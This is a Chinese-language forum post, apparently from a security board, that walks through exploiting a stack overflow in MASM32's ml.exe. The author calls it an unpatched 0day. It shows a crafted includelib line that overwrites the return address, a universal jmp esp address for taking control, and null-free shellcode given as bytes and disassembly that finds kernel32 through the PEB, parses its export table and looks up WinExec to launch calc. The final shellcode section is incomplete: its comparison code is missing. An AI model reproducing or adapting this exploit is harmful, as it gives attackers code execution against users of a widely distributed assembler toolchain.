# [原创]masm32之ml.exe栈溢出漏洞利用

-----------------------
前置知识:栈溢出原理、PE格式、PEB结构、汇编语言。
使用工具:masm、od、winhex。
-----------------------

正题之前先扯两句废话，这是本人在看雪潜水多年来的第一贴，还请大家指教。这个漏洞是半年前无意中发现的，当时随便看了看就丢在一边了，昨个闲下来翻硬盘发现了这个文件，就拿出来写了个利用。虽然放了半年，但是网上还是找不到类似的漏洞，所以姑且还是个0day。而且这个漏洞所针对的ml.exe使用很广泛，包括看雪工具区的MASM32 v11和RadASM 2.2.1.2汉化，不过并不包含新版vs中的ml.exe，测试了vs11和12都没有效果。

废话扯完了，然后呢……继续废话。有一天，我照常的在用masm写代码，当我按了编译的时候，ml.exe报错了，错误地址看上去像是一个字符串的ascii码，这是溢出的典型现象。

测试代码

```
.686p
.mmx
.model flat
option casemap :none
includelib  1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111bgrd1a1111111111111111111111111111111111111111111
end
```


字符bgrd会覆盖掉返回地址，导致一个经典的栈溢出，顺带一提，如果这行更长，还会覆盖seh链，有其他利用方式。

对于漏洞产生的原因，我并没有过多的去分析，这也是为什么帖子标题里只有利用而没有分析，所以就简单的认为是ml没有注意字符串的长度吧。虽然这样很不负责但是确实不用去分析也能完成这个漏洞的利用。所以让我们进入正题。编写一个最简陋的shellcode来测试利用。(没错，是简陋，不是简单或者什么的 因为省略了太多东西，甚至包括编写过程的描述)

**第一步。流程控制**
我们需要接管程序的流程，单单报错不是我们想要的，通常情况下，我们需要给覆盖掉返回地址的那4个字节一个内容为jmp esp的地址，这样就可以跳到堆栈里我们自己的代码了，很多人看到这里应该已经明白了，7ffa4512对吧，嗯就是这样。这个地址是一个通杀几乎所有win系统的地址，也就是所有系统的这个地址的代码都是jmp esp而且可执行。于是我们用winhex打开上面内容的asm，把bgrd的ascii码替换成7ffa4512，如图。
![](https://bbs.kanxue.com/upload/attach/201402/345747_ox69b9rpvtk3kwt.png)
这样，我们就可以让eip落在我们自己的代码中了，准确的位置就是紧挨着我们刚才替换的那4个字节。现在我们可以开始写shellcode了。

**第二步。寻找kernel32基址**
光能写代码仍然不够，我们还需要可以调用系统功能，也就是api，来方便我们进一步操作。
通常寻找kernel32基址的方法有三种，在peb中看模块表，查找最上层seh，和去堆栈起始处查找。第一种方法最简单，代码如下。(从od中复制出来的，为了能看到字节码 下面大部分也是)

```

64 A1 30 00 00 00 8B 40 0C 8B 40 0C 8B 00 8B 00 8B 40 18
772404CB      64:A1 30000000         mov     eax, dword ptr fs:[30]
772404D1      8B40 0C                mov     eax, dword ptr [eax+C]
772404D4      8B40 0C                mov     eax, dword ptr [eax+C]
772404D7      8B00                   mov     eax, dword ptr [eax]
772404D9      8B00                   mov     eax, dword ptr [eax]
772404DB      8B40 18                mov     eax, dword ptr [eax+18]
```


关于代码就不多讲了，实际上让我详细讲也不一定能说明白，我表达能力不太好应该都看出来了。可以参考kssd中的“系统篇-windows数据结构-PEB”。
现在代码有了，但是字节码中出现了00，这是没办法使用的，因为我们的shellcode是放在文本中的，而00又是文本结束符，我们的code就可能会被截断，这个问题需要改变代码来避免。(0a和0d同理，换行也会截断)
然后我简单的修改了下代码，变成了这样。

```
6A 30 5B 64 8B 03 8B 40 0C 8B 40 0C 8B 18 8B 03 8B 70 18
772404E1     6A 30                    push    30
772404E3     5B                       pop     ebx
772404E4     64:8B03                  mov     eax, dword ptr fs:[ebx]
772404E7     8B40 0C                  mov     eax, dword ptr [eax+C]
772404EA     8B40 0C                  mov     eax, dword ptr [eax+C]
772404ED     8B18                     mov     ebx, dword ptr [eax]
772404EF     8B03                     mov     eax, dword ptr [ebx]
772404F1     8B70 18                  mov     esi, dword ptr [eax+18]
```


现在代码中就没有这类字符了，并且我修改了最后一句，使结果存入了esi。(我没有在shellcode之前加入用来缓冲的空指令，所以尽量不使用堆栈，因为代码就在esp附近，随意对堆栈修改可能就直接破坏了我们的代码)
 **第三步。寻找导出表和从导出表中找到我们需要的api并调用**
我们需要的api都有什么呢？通常情况下我们需要LoadLibrary和GetProcAddess,有了这两个api我们就可以获得所有api的地址来调用了。不过我这里只是写一个简陋的例子，所以嘛，我们只找一下WinExec就行了，找到后传个calc调用下就知道是否执行成功了。

寻找导出表的汇编代码如下，这部分知识可以从kssd中的"系统篇-PE格式-输出表"中找到。

```
  assume  eax:ptr IMAGE_DOS_HEADER    ;eax为基址
  mov  eax,[eax].e_lfanew
  add  eax,krnlbz
  assume  eax:ptr  IMAGE_NT_HEADERS    ;pe头
  lea  eax,[eax].OptionalHeader
  assume  eax:ptr  IMAGE_OPTIONAL_HEADER32    ;可选pe头
  lea  eax,[eax].DataDirectory      
  assume  eax:ptr  IMAGE_DATA_DIRECTORY    ;导出表结构
  mov  eax,[eax].VirtualAddress    
  add  eax,krnlbz
  assume  eax:ptr  IMAGE_EXPORT_DIRECTORY
  push  [eax].NumberOfNames
  push  [eax].AddressOfNames
  push  [eax].AddressOfFunctions
```


这段代码其实是从我的其他程序中翻出来的，不过看了下能用，就没重写。

题外话，寄存器这东西很容易记混，而且在od中又不能用别名，所以现在记一下
esi是kernel32的基址
edx是AddressOfFunctions
ebp是AddressOfNames
edi是NumberOfNames
在寻找api之前，我们再补两句代码

```

03 EE 03 D6
77240527     03EE                     add     ebp, esi
77240529     03D6                     add     edx, esi
```


给两个偏移加上基址，方便后面的操作。

现在是最复杂的部分，搜索api并调用。不过说复杂其实也很简单，因为简陋到寻找api都是直接比较名字的。

```

然后判断前4字节是否为456E6957，也就是WinE

不是则跳走继续循环
```

仔细看的话会注意到，那句压入字符串calc的代码被我扔到最后面去了，因为字符串后面必然有个00，而且向下call的时候，call的字节码也会有难以修改的00.于是放到了最后，也就不会被截断了。并且也解决了call中有00的问题。
